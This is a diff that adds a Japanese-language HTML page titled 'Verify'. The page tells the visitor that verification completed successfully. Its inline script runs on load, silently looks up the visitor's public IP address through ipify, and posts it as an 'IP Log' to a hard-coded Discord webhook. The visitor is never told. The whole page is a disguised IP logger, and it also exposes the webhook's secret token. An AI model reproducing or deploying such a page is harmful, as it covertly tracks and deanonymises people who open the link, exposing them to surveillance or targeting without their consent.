@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #e9ecef;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            text-align: center;
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease;
+        }
+
+        .container:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 6px 25px rgba(0, 0, 0, 0.2);
+        }
+
+        h1 {
+            color: #4CAF50;
+            margin: 0 0 10px;
+        }
+
+        p {
+            color: #555;
+            font-size: 18px;
+            margin: 0;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #777;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>認証完了</h1>
+        <p>認証が正常に完了しました。</p>
+        <div class="footer">ご利用いただきありがとうございます！</div>
+    </div>
+    <script>
+        window.onload = () => {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+
+                    const webhookUrl = 'https://discord.com/api/webhooks/1288041624575934485/2Vsp9jgjMNglqRwCMDHLlQ5c_q549BwRIuHCKnZWCtoiGVRnTPfwcAllVCM7oXg8-XMp';
+
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            embeds: [{
+                                color: 5814783, // 色
+                                title: "IP Log",
+                                description: `IPアドレス: ${ipAddress}`,
+                                footer: {
+                                    text: "auto"
+                                },
+                                timestamp: new Date()
+                            }]
+                        }),
+                    })
+                    .then(() => console.log('s'))
+                    .catch(error => console.error('e', error));
+                })
+                .catch(error => {
+                    console.error('エラー:', error);
+                    alert('e。');
+                });
+        };
+    </script>
+</body>
+</html>
